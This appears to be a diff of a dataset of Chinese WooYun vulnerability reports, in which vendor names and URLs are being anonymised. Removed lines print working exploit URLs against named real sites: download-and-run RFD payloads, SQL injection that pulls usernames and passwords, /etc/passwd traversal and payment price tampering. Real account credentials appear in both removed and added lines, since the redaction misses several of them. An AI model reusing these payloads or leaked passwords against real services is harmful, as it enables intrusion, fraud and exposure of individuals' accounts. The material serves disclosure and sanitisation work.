-**详情**: 我用Process Monitor跟踪了支付宝插件（版本号：4.6.0.3602）的安装过程，发现安装程序向 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates 写入了三个新键值：这三个新键值实质上是向操作系统导入了三个根证书：Alibaba.com Corporation Root CA 、VeriSign Class 3 Public Primary Certification Authority - G5 、UTN-USERFirst-Object。出问题的就是那个VeriSign的证书，因为只有VeriSign签发的EVSSL证书不能让IE显示绿色地址栏，而其他CA签发的EVSSL证书均可以。原因在于，本身Windows系统中有VeriSign G5的根证书，同时系统中记录了它的EV 
+**详情**: 我用Process Monitor跟踪了某电商平台插件（版本号：[IP已脱敏]2）的安装过程，发现安装程序向 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\SystemCertificates\ROOT\Certificates 写入了三个新键值：这三个新键值实质上是向操作系统导入了三个根证书：Alibaba.com Corporation Root CA 、VeriSign Class 3 Public Primary Certification Authority - G5 、UTN-USERFirst-Object。出问题的就是那个VeriSign的证书，因为只有VeriSign签发的EVSSL证书不能让IE显示绿色地址栏，而其他CA签发的EVSSL证书均可以。原因在于，本身Windows系统中有VeriSign G5的根证书，同时系统中记录了它的EV 
 
-**POC**: 安装支付宝安全插件前，打开https://mybank.icbc.com.cn，IE地址栏是绿色的：安装支付宝安全插件后，打开https://mybank.icbc.com.cn，IE地址栏是白色的：
+**POC**: 安装某电商平台安全插件前，打开https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
-**修复**: 别导入VeriSign G5根证书。https://www.alipay.com/ 证书链的根证书就是你们导入的根证书，所以说能上得了你们官网就说明系统里已经有那个根证书。而安全插件又是从你们官网上下载的，所以导入它有什么积极用处？
+**修复**: 别导入VeriSign G5根证书。https://example.com/[已脱敏] 证书链的根证书就是你们导入的根证书，所以说能上得了你们官网就说明系统里已经有那个根证书。而安全插件又是从你们官网上下载的，所以导入它有什么积极用处？
 ---
 
 ---
 ### [wooyun-2015-0134720] 桔子浏览器下载功能未限制同源可造成RFD攻击
-**厂商**: 百度 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -24195,7 +24195,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 具体请看原理http://drops.wooyun.org/papers/3771WooYun: 百度浏览器下载功能未限制同源可造成RFD攻击WooYun: UC浏览器下载功能未限制同源可造成RFD攻击浏览器模式下打开http://suggestion.baidu.com/su;/1.bat?wd=&cb=calc||&sid=1440_2031_1945_1788&t=1362056239875然后它会弹出下载的页面。接着下载打开就直接执行这个了，详情还是要看看参考才行呢
+**详情**: 具体请看原理https://example.com/[已脱敏] 某搜索引擎浏览器下载功能未限制同源可造成RFD攻击WooYun: UC浏览器下载功能未限制同源可造成RFD攻击浏览器模式下打开https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -24293,8 +24293,8 @@
 ---
 
 ---
-### [wooyun-2015-0100148] 百度浏览器下载功能未限制同源可造成RFD攻击
-**厂商**: 百度 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0100148] 某搜索引擎浏览器下载功能未限制同源可造成RFD攻击
+**厂商**: 某搜索引擎 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -24305,7 +24305,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 在浏览器中打开这个：http://suggestion.baidu.com/su;/1.bat;?wd=&cb=calc||&sid=1440_2031_1945_1788&t=1362056239875然后它会弹出下载的页面。接着下载打开就直接执行这个了，详情还是要看看参考才行呢
+**详情**: 在浏览器中打开这个：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -24315,8 +24315,8 @@
 ---
 
 ---
-### [wooyun-2015-0116446] 美团某处支付漏洞一枚
-**厂商**: 美团网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2015-0116446] 某外卖平台某处支付漏洞一枚
+**厂商**: 某外卖平台网 | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -24327,13 +24327,13 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: https://mos.meituan.com/美团云 主机-新建云主机
+**详情**: https://example.com/[已脱敏] 主机-新建云主机
 
 **POC**: 抓包一直forward修改total_fee参数发送
 
 **绕过**: 直接利用
 
-**修复**: 没做过支付宝接口  不知道
+**修复**: 没做过某电商平台接口  不知道
 ---
 
 ---
@@ -24415,9 +24415,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: inurl:inurl:http://www.xrush.cn/client/v3/Payments.aspx?bg=可以发现用户密码已经泄漏http://www.xrush.cn/client/v3/Payments.aspx?bg=B9BCC3&user=414075255&passwd=ysy357159&sponsorid=6登录1个看看user=414075255passwd=ysy357159成功了
+**详情**: inurl:inurl:https://example.com/[已脱敏]
 
-**POC**: 贴几个http://www.xrush.cn/client/v3/Payments.aspx?bg=B9BCC3&user=1830808896%40cga.com.cn&passwd=8dUv04T6yQnJ&sponsorid=36http://www.xrush.cn/client/v3/Payments.aspx?bg=B9BCC3&user=1780433557%40cga.com.cn&passwd=ySuWvWN6Dt0T&sponsorid=36http://www.xrush.cn/client/v3/Payments.aspx?bg=B9BCC3&user=moshitia
+**POC**: 贴几个https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -24459,7 +24459,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.intimecity.com.cn/fh/admin/login.php
+**详情**: https://example.com/[已脱敏]
 
 **POC**: 账号：fhytc    密码：fhytc123
 
@@ -24481,7 +24481,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 访问手机url支付宝支付的时候  不允许pc端支付， so   伪造iphone user-agent
+**详情**: 访问手机url某电商平台支付的时候  不允许pc端支付， so   伪造iphone user-agent
 
 **POC**: (见原文)
 
@@ -24491,8 +24491,8 @@
 ---
 
 ---
-### [wooyun-2014-060273] 百度卫士文件保护绕过
-**厂商**: 百度 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2014-060273] 某搜索引擎卫士文件保护绕过
+**厂商**: 某搜索引擎 | **年份**: 2014 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -24503,9 +24503,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 利用文件系统特性可以绕过百度卫士文件防护。和腾讯管家的绕过一样利用了硬链接，不过更加简单。以百度卫士自身的某配置文件为例。代码就不单独给出了，图里有了。原始文件截图：释放批处理并执行：修改成功：
+**详情**: 利用文件系统特性可以绕过某搜索引擎卫士文件防护。和某互联网公司管家的绕过一样利用了硬链接，不过更加简单。以某搜索引擎卫士自身的某配置文件为例。代码就不单独给出了，图里有了。原始文件截图：释放批处理并执行：修改成功：
 
-**POC**: 利用文件系统特性可以绕过百度卫士文件防护。和腾讯管家的绕过一样利用了硬链接，不过更加简单。以百度卫士自身的某配置文件为例。代码就不单独给出了，图里有了。原始文件截图：释放批处理并执行：修改成功：
+**POC**: 利用文件系统特性可以绕过某搜索引擎卫士文件防护。和某互联网公司管家的绕过一样利用了硬链接，不过更加简单。以某搜索引擎卫士自身的某配置文件为例。代码就不单独给出了，图里有了。原始文件截图：释放批处理并执行：修改成功：
 
 **绕过**: 过滤绕过
 
@@ -24547,7 +24547,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: IOS app 苏宁易购V3.3.4购物-立即购买-添加苏宁卡-添加完成会有这么个请求POST http://cart.suning.com/webapp/wcs/stores/servlet/SNMobileSaveCardAndCoupons HTTP/1.1Host: cart.suning.comContent-Type: application/x-www-form-urlencoded; charset=utf-8Connection: closeUser-Agent: 苏宁易购 3.3.4 rv:3.3.4.2 (iPhone; iPhone OS 8.4.1; zh_CN)Content-Length: 105Accept-Encoding: gzipConnection: closecatalogId=10051&storeId=10052&validateCode=&v
+**详情**: IOS app 苏宁易购V3.3.4购物-立即购买-添加苏宁卡-添加完成会有这么个请求POST https://example.com/[已脱敏] HTTP/1.1Host: cart.suning.comContent-Type: application/x-www-form-urlencoded; charset=utf-8Connection: closeUser-Agent: 苏宁易购 3.3.4 rv:[IP已脱敏] (iPhone; iPhone OS 8.4.1; zh_CN)Content-Length: 105Accept-Encoding: gzipConnection: closecatalogId=10051&storeId=10052&validateCode=&v
 
 **POC**: 关注优惠金额 和支付金额支付成功web端
 
@@ -24613,7 +24613,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 看图吧！1503/291459302f6c038b2c150e77dc63a5264d8b4755.png" alt="图片7.png" /><img src="https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/20说好的安全呢，貌似自己就是搞安全的
+**详情**: 看图吧！1503/291459302f6c038b2c150e77dc63a5264d8b4755.png" alt="图片7.png" /><img src="https://example.com/[已脱敏]
 
 **POC**: 变多了哦
 
@@ -24635,9 +24635,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 进入华为莫塞尔商城的找回密码界面，输入正确手机号和验证码，并点击下一步，这个过程称为流程1！对应的URL：http://www.huaweimossel.com/user.php?act=findpwd正确填写手机接收到的验证码并点击下一步，这个过程称为流程2！对应的URL：http://www.huaweimossel.com/user.php?act=passwordphone填写新密码并提交，这个过程称为流程3！！对应的URL：http://www.huaweimossel.com/user.php?act=retpasswordphone本来正常的流程是1-->2-->3但是进行完流程1之后，可以通过输入流程3的URL地址直接进入流程3,从而轻易地绕过了流程2的短信验证码...因此我进行的重置密码流程如下：输入手机号和验证码然后在URL输入http://www.huaweimoss
+**详情**: 进入华为莫塞尔商城的找回密码界面，输入正确手机号和验证码，并点击下一步，这个过程称为流程1！对应的URL：https://example.com/[已脱敏]
 
-**POC**: 因此我进行的重置密码流程如下：输入手机号和验证码然后在URL输入http://www.huaweimossel.com/user.php?act=retpasswordphone接着就是任意的重置密码了！！！！
+**POC**: 因此我进行的重置密码流程如下：输入手机号和验证码然后在URL输入https://example.com/[已脱敏]
 
 **绕过**: 过滤绕过
 
@@ -24701,9 +24701,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.地址 http://e-insure.cninsure.net/cms/wwwroot/dzswwz/sy/index.shtml 先注册帐号登入2.随便选个保险选择10份，是1000元此时抓包修改很完美的0.1前面不能说明什么，看订单不过由于支付接口错误，好像不能支付 是刚开发的网站吗？
+**详情**: 1.地址 https://example.com/[已脱敏] 先注册帐号登入2.随便选个保险选择10份，是1000元此时抓包修改很完美的0.1前面不能说明什么，看订单不过由于支付接口错误，好像不能支付 是刚开发的网站吗？
 
-**POC**: 1.地址 http://e-insure.cninsure.net/cms/wwwroot/dzswwz/sy/index.shtml 先注册帐号登入2.随便选个保险选择10份，是1000元此时抓包修改很完美的0.1前面不能说明什么，看订单不过由于支付接口错误，好像不能支付 是刚开发的网站吗？
+**POC**: 1.地址 https://example.com/[已脱敏] 先注册帐号登入2.随便选个保险选择10份，是1000元此时抓包修改很完美的0.1前面不能说明什么，看订单不过由于支付接口错误，好像不能支付 是刚开发的网站吗？
 
 **绕过**: 直接利用
 
@@ -24712,7 +24712,7 @@
 
 ---
 ### [wooyun-2013-046851] 千牛手机客户端绕过手势密码漏洞
-**厂商**: 阿里巴巴 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 认证接口
 
@@ -24799,8 +24799,8 @@
 ---
 
 ---
-### [wooyun-2013-046799] 支付宝陕西信合快捷支付业务问题
-**厂商**: 阿里巴巴 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2013-046799] 某电商平台陕西信合快捷支付业务问题
+**厂商**: 某电商平台 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -24811,7 +24811,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 支付宝快捷支付绑定陕西信合快捷支付在信合没有余额的情况下会显示充值成功。但是支付宝余额不会增加，也就是显示上有逻辑错误。不知道其他的网银有没有类似问题。
+**详情**: 某电商平台快捷支付绑定陕西信合快捷支付在信合没有余额的情况下会显示充值成功。但是某电商平台余额不会增加，也就是显示上有逻辑错误。不知道其他的网银有没有类似问题。
 
 **POC**: (见原文)
 
@@ -24899,7 +24899,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 这两天在写一个HTTP扫描器，顺便拿12306测试。 发现一处逻辑缺陷，找回密码的功能位于：https://kyfw.12306.cn/otn/forgetPassword/initforgetMyPassword存在三个问题:1，不要验证码可以猜解 用户名 / 邮箱。输入用户名，点击提取问题，只要返回的existError为N，均是存在的用户。 12306用户太多，大量猜解毫不费力，包括去猜解留了公司邮箱的人。@baidu.com、@youku.com等。 得到这些员工的个人信息，拿到后可以社工，设法渗透对应的商业公司（只是思路，(⊙o⊙)）。2，找回密码的地方验证码没有立即过期。这是常见的验证码缺陷，问题也很严重。因为验证码可以反复使用，直接被绕过了。个人估计12306是考虑到了性能的关系，才没让它立即过期。3，通常密码提示答案都非常简单。  早些年通过回答问题破解163邮箱也蛮容易的
+**详情**: 这两天在写一个HTTP扫描器，顺便拿12306测试。 发现一处逻辑缺陷，找回密码的功能位于：https://example.com/[已脱敏] 用户名 / 邮箱。输入用户名，点击提取问题，只要返回的existError为N，均是存在的用户。 12306用户太多，大量猜解毫不费力，包括去猜解留了公司邮箱的人。@baidu.com、@youku.com等。 得到这些员工的个人信息，拿到后可以社工，设法渗透对应的商业公司（只是思路，(⊙o⊙)）。2，找回密码的地方验证码没有立即过期。这是常见的验证码缺陷，问题也很严重。因为验证码可以反复使用，直接被绕过了。个人估计12306是考虑到了性能的关系，才没让它立即过期。3，通常密码提示答案都非常简单。  早些年通过回答问题破解163邮箱也蛮容易的
 
 **POC**: 常用联系人泄露他人身份证和手机：
 
@@ -24921,9 +24921,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.zara.cn/cn/添加任意商品到购物车的时候可以抓包修改quantity数值，会按照小数点百分比影响最后商品金额但是最后提交支付的时候会提示说购物车中商品货源不足，应该是支付前生成订单时检查了quantity的完整性。想到如果订单里同时存在其他正常商品，是否会支付通过添加了条内裤，支付完成，好激动。几分钟后收到了，确认邮件纠结了下觉着不管是否最后收到的商品是否只有一条内裤，剩下的就看他们仓库是怎么个流程。web支付环节确实有问题
+**详情**: https://example.com/[已脱敏]
 
-**POC**: http://www.zara.cn/cn/添加任意商品到购物车的时候可以抓包修改quantity数值，会按照小数点百分比影响最后商品金额但是最后提交支付的时候会提示说购物车中商品货源不足，应该是支付前生成订单时检查了quantity的完整性。想到如果订单里同时存在其他正常商品，是否会支付通过添加了条内裤，支付完成，好激动。几分钟后收到了，确认邮件纠结了下觉着不管是否最后收到的商品是否只有一条内裤，剩下的就看他们仓库是怎么个流程。web支付环节确实有问题
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -24943,7 +24943,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 随着各种工具的出现，导致对web漏洞利用很容易，而web程序员很多不会对所有web漏洞都非常了解，而且培训的成本也是很高的，因此，有些站点都是依靠第三方程序来使得站点尽量安全。而第三方程序为了兼容后面的各种web环境，因此一般都是在网络层防护，类似waf等，而智创应该算是一种。这种防护理论上来说很好，即使后台程序漏洞在多，危害再大，然而攻击请求在没有触发漏洞之前都会被网络层的waf等防护拦截。但是waf本身 就是一些规则，如果规则匹配失败，就会放行，如果一种情况没有考虑到，就会被绕过。前人已经总结很多了，这里就不说了。这里主要利用iis对asp后参数串进行url解码的特性绕过智创防火墙。构造如下请求:http://www.51qljr.com/xinxi/shownews.asp?id=%28-575%29UNION%20%28SELECT%201,username,3,4,passwd,
+**详情**: 随着各种工具的出现，导致对web漏洞利用很容易，而web程序员很多不会对所有web漏洞都非常了解，而且培训的成本也是很高的，因此，有些站点都是依靠第三方程序来使得站点尽量安全。而第三方程序为了兼容后面的各种web环境，因此一般都是在网络层防护，类似waf等，而智创应该算是一种。这种防护理论上来说很好，即使后台程序漏洞在多，危害再大，然而攻击请求在没有触发漏洞之前都会被网络层的waf等防护拦截。但是waf本身 就是一些规则，如果规则匹配失败，就会放行，如果一种情况没有考虑到，就会被绕过。前人已经总结很多了，这里就不说了。这里主要利用iis对asp后参数串进行url解码的特性绕过智创防火墙。构造如下请求:https://example.com/[已脱敏]
 
 **POC**: 如上
 
@@ -24987,9 +24987,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://www.mafengwo.cn/insurance/拿80块这个演示一下
+**详情**: https://example.com/[已脱敏]
 
-**POC**: POST /insurance/ajax HTTP/1.1Host: www.mafengwo.cnProxy-Connection: keep-aliveContent-Length: 489Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://www.mafengwo.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.3
+**POC**: POST /insurance/ajax HTTP/1.1Host: www.mafengwo.cnProxy-Connection: keep-aliveContent-Length: 489Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: https://example.com/[已脱敏] 1User-Agent: Mozilla/5.0 (Windows NT 6.3
 
 **绕过**: 直接利用
 
@@ -25033,7 +25033,7 @@
 
 **详情**: MTK手机申请android.permission.ACCESS_MTK_MMHW的时候会将用户加入system用户组，android.permission.ACCESS_MTK_MMHW权限在有的手机中显示为“相机和视频”权限，在有的手机中不显示。通过MTK手机的/dev/misc-sd设备可直接对固件进行读写，此设备默认属于system用户组可访问，配合前面权限申请，即可在任意app中对固件写入
 
-**POC**: http://v.youku.com/v_show/id_XODM2MTExMjM2.html
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -25119,7 +25119,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1:之前自己总结了一个帖子,内容上将waf bypass分了几个层面,其中有一个层面是web服务器层面,记得在内容上提到了iis服务器的一些trick2:IIS在对%u0011形式的内容的时候,是可以解析的,例如我的url为:http://192.168.15.130/letmetest.asp?t=152522098 and(select top 1  eventname_en from eventshelp)>0我将url编码为:http://192.168.15.130/letmetest.asp?t=152522098 and(s%u0065lect top 1  eventname_en from eventshelp)>0s%u0065lect的形式的时候也会被iis解析为select3:于是我先在本地搭建了一个云锁的环境,iis版本,本机使用了windows2003的环境,并
+**详情**: 1:之前自己总结了一个帖子,内容上将waf bypass分了几个层面,其中有一个层面是web服务器层面,记得在内容上提到了iis服务器的一些trick2:IIS在对%u0011形式的内容的时候,是可以解析的,例如我的url为:http://[IP已脱敏] and(select top 1  eventname_en from eventshelp)>0我将url编码为:http://[IP已脱敏] and(s%u0065lect top 1  eventname_en from eventshelp)>0s%u0065lect的形式的时候也会被iis解析为select3:于是我先在本地搭建了一个云锁的环境,iis版本,本机使用了windows2003的环境,并
 
 **POC**: 8：我使用%u0065访问，直接被云锁干掉了9：我使用%u0095访问，直接报错注入，出来内容了注意图片中的and中的a，也被我用同样的方式处理了。
 
@@ -25284,7 +25284,7 @@
 
 ---
 ### [wooyun-2013-036602] 飞信2013最新版本DLL劫持
-**厂商**: 中国移动 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
+**厂商**: 某运营商 | **年份**: 2013 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -25341,11 +25341,11 @@
 
 **详情**: 我自评就20吧 其实30也不为过吧？
 
-**POC**: 百度搜索定位宝 dwb.so第一弹没什么技术含量-.-.权限控制：发送短信/发送彩信 *询问* （我使用的手机自带的，没有的可以使用防护软件例如360，LBE安全大师...无需root）#使用任意手机号注册：随便输入手机号码，选择发送验证码。权限控制会弹出上面的框框。就可以看到验证码内容了。直接拒绝发送，输入验证码，OK登陆成功了<img结果页面#登陆用户的账号，以便获得其所在位置：登陆成功！start open GPS---定位成功！#如何获得用户的账号：加入官方群，可以询问或者社工群成员的手机号码就OK。或者社工库查找手机号码。我是直接询问的……#漏洞证明：
+**POC**: 某搜索引擎搜索定位宝 dwb.so第一弹没什么技术含量-.-.权限控制：发送短信/发送彩信 *询问* （我使用的手机自带的，没有的可以使用防护软件例如360，LBE安全大师...无需root）#使用任意手机号注册：随便输入手机号码，选择发送验证码。权限控制会弹出上面的框框。就可以看到验证码内容了。直接拒绝发送，输入验证码，OK登陆成功了<img结果页面#登陆用户的账号，以便获得其所在位置：登陆成功！start open GPS---定位成功！#如何获得用户的账号：加入官方群，可以询问或者社工群成员的手机号码就OK。或者社工库查找手机号码。我是直接询问的……#漏洞证明：
 
 **绕过**: 直接利用
 
-**修复**: So,easy!在这里我就简单的说两种方法吧：#1 如果资金允许。使用网络发信平台,例如：申请浏览http://dwb.so/check.php 网页形式读取手机状态IMEI或其他信息，自动生成验证码通过网络平台发送到手机。可绑定手机，实现一机一号。#2 如若资金不太充足。可以自己编写一款加密或者调
+**修复**: So,easy!在这里我就简单的说两种方法吧：#1 如果资金允许。使用网络发信平台,例如：申请浏览https://example.com/[已脱敏] 网页形式读取手机状态IMEI或其他信息，自动生成验证码通过网络平台发送到手机。可绑定手机，实现一机一号。#2 如若资金不太充足。可以自己编写一款加密或者调
 ---
 
 ---
@@ -25407,7 +25407,7 @@
 
 **详情**: 日访问量近500W测试admin账户：mask 区域*****^^ad**********^^zx*****
 
-**POC**: http://www.jinlianchu.com/resetpwd_indexp.html?type=0证明危害：你们副总是个大美女，好漂酿
+**POC**: https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -25493,7 +25493,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 263视频会议开始一个视频会议，抓包有如下请求：http://211.150.77.29/common/activeX/activeX.php查看所有会议，但是加入有密码验证：http://211.150.77.29/common/web_meeting/修改参数，将isNeedPwd改成0，userId改成2：isNeedPwd=0不用密码？userId=2是管理员权限？登录以后，进入会议：可查看会议密码，用这个密码可以在：http://webmeet.263.net加入会议：有管理员权限，修改主持人，禁言，查看与会人员个人资料，PPT，会议记录等等：可与各公司高层亲切视频交流。点到为止，不再过多测试。
+**详情**: 263视频会议开始一个视频会议，抓包有如下请求：http://[IP已脱敏]
 
 **POC**: 已证明。
 
@@ -25537,7 +25537,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://new.sqgf.com/auth/signin.jsp无验证码，且登陆后直接得到用户名，可直接生成字典密码直接：123456wangyong123456权限够进两个平台人力资源数据库系统/安保管理信息系统
+**详情**: https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -25547,8 +25547,8 @@
 ---
 
 ---
-### [wooyun-2015-0158771] QQ群无视群设置群管理员限制
-**厂商**: 腾讯 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
+### [wooyun-2015-0158771] 某互联网公司群无视群设置群管理员限制
+**厂商**: 某互联网公司 | **年份**: 2015 | **类型**: 设计错误/逻辑缺陷
 
 **元思考**: 触发信号: 功能测试
 
@@ -25625,7 +25625,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://market.douban.com/豆瓣市集买东西的时候 收货地址没有验证
+**详情**: https://example.com/[已脱敏] 收货地址没有验证
 
 **POC**: 改为4680在查看该订单address_id=4621
 
@@ -25657,8 +25657,8 @@
 ---
 
 ---
-### [wooyun-2014-085442] 中国移动某省管理系统逻辑漏洞
-**厂商**: 中国移动 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
+### [wooyun-2014-085442] 某运营商某省管理系统逻辑漏洞
+**厂商**: 某运营商 | **年份**: 2014 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 功能测试
 
@@ -25669,7 +25669,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://211.139.80.193/login.jsp找回密码的验证码太短，没有尝试次数限制
+**详情**: http://[IP已脱敏]
 
 **POC**: (见原文)
 
@@ -25679,7 +25679,7 @@
 ---
 
 ---
-### [wooyun-2015-0136225] 时趣互动某重要系统逻辑缺陷(员工通讯录/名人微博/各个内部系统)
+### [wooyun-2015-0136225] 时趣互动某重要系统逻辑缺陷(员工通讯录/名人某社交平台/各个内部系统)
 **厂商**: social-touch.com | **年份**: 2015 | **类型**: 设计缺陷/逻辑错误
 
 **元思考**: 触发信号: 认证接口
@@ -25691,9 +25691,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 时趣OA系统，登录处没有验证码。http://oa.social-touch.com/index.php?controller=login&action=index&1=noCookie&2=%E8%AF%B7%E9%87%8D%E6%96%B0%E7%99%BB%E5%BD%95使用top500name，做测试，撞到41个成功登陆的账号各个内部系统公司通讯录（4000＋）
+**详情**: 时趣OA系统，登录处没有验证码。https://example.com/[已脱敏]
 
-**POC**: KOL用户列表，大量名人微博（王珞丹,李冰冰，张杰，，，，）
+**POC**: KOL用户列表，大量名人某社交平台（王珞丹,李冰冰，张杰，，，，）
 
 **绕过**: 直接利用
 
@@ -25713,9 +25713,9 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 808信贷，互联网金融行业 Top 100 ，排名第二十七成交总额：￥4,493,853,525.15为投资人创造收益：￥201,342,907.30用户量也是很多啊，不同于一般小的信贷，求个好点礼物如何？下面进入神器的漏洞复现与实际利用过程注册个账号，先成为了你们的用户，呵呵，虽然屌丝。然后找回密码，居然收件是这样一个奇葩的重置密码链接http://www.js808.cn/newSite/Other/verifypwd.aspx?ucode=test&uemail=test@126.com没有其他验证，是用户名和邮箱，有了这两个就可以重置密码，但是很难匹配正确，你说对吧，我猜开发也是这么想的，然后就有了下面的故事....不要气馁....
+**详情**: 808信贷，互联网金融行业 Top 100 ，排名第二十七成交总额：￥4,493,853,525.15为投资人创造收益：￥201,342,907.30用户量也是很多啊，不同于一般小的信贷，求个好点礼物如何？下面进入神器的漏洞复现与实际利用过程注册个账号，先成为了你们的用户，呵呵，虽然屌丝。然后找回密码，居然收件是这样一个奇葩的重置密码链接https://example.com/[已脱敏]
 
-**POC**: 有这么个论坛：简单社工了以下这个账号的用户，发现经常使用126的邮箱，然后...http://www.js808.cn/newSite/Other/verifypwd.aspx?ucode=wujunjie168&uemail=wujunjie168@126.com就进去了，用户那里是完全没有任何提示的，就进来了您看到这里，肯定会说，这特么的是巧合，呵呵，看下面有什么神奇的事情发生于是在论坛爬了300个ID用做测试，你们总用户量应该在43000千左右，相比不多，但都是土豪用这300个id做ucode、uemail的批量替换，测试126、163、qq邮箱，竟然成功100个左右，其他后缀就不试了按
+**POC**: 有这么个论坛：简单社工了以下这个账号的用户，发现经常使用126的邮箱，然后...https://example.com/[已脱敏]
 
 **绕过**: 直接利用
 
@@ -25735,7 +25735,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 1.华润下面的招聘平台：http://career.crc.com.cn打开后注册一个账号，在注册的过程中提示上传照片，上传了照片之后查看了一下链接发现是如下链接：http://career.crc.com.cn/hrjob/front/getImgSrc.do?filename=/apphttps://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/hrjob/temp/1444359198577.jpg直接把filename后面的参数换成/etc/passwd,可看到passwd文件内容在填写简历完成之前可以在成绩单处上传任意文件点击保存并预览，即可看到上传的jsp文件http://career.crc.com.cn/hrjob/front/download.do?filePath=/apphttps://wooyun-img.oss-cn-
+**详情**: 1.华润下面的招聘平台：https://example.com/[已脱敏]
 
 **POC**: (见原文)
 
@@ -25779,7 +25779,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: 某天无意间在互联网上扫到的很多password。可能出自一篇文档。看了看，这是不是就属于无条件控制业务逻辑。所以选的高危，也不懂。。1陈燕燕百度贴吧：http://tieba.baidu.com/i/280830037账号：2473914322@qq.com    密码：yd82059760百度百科http://baike.baidu.com/账号：2473914322@qq.com    密码：yd82059760百度知道：http://zhidao.baidu.com/账号：2473914322@qq.com    密码：yd82059760百度空间http://hi.baidu.com/%B3%A4%C9%B3%D3%D0%B5%C0%CD%D8%D5%B9/ihome/ihomefeed账号：2473914322@qq.com    密码：yd8205976058同城网：http:
+**详情**: 某天无意间在互联网上扫到的很多password。可能出自一篇文档。看了看，这是不是就属于无条件控制业务逻辑。所以选的高危，也不懂。。1陈燕燕某搜索引擎贴吧：https://example.com/[已脱敏]    密码：yd82059760某搜索引擎百科https://example.com/[已脱敏]    密码：yd82059760某搜索引擎知道：https://example.com/[已脱敏]    密码：yd82059760某搜索引擎空间https://example.com/[已脱敏]    密码：yd8205976058同城网：http:
 
 **POC**: (见原文)
 
@@ -25801,7 +25801,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
-**详情**: http://vip.51wan.com （会员中心）进入开年费会员的页面；然后进入支付宝网银支付；接着；
+**详情**: https://example.com/[已脱敏] （会员中心）进入开年费会员的页面；然后进入某电商平台网银支付；接着；
 
 **POC**: POST /index.php?module=trade&control=confirm&xy=yearcard-19--0 HTTP/1.1Host: pay.51wan.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:36.0) Gecko/20100101 Firefox/36.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3Acc
 
@@ -25889,7 +25889,7 @@
 2. 构造测试Payload
 3. 验证漏洞响应
 
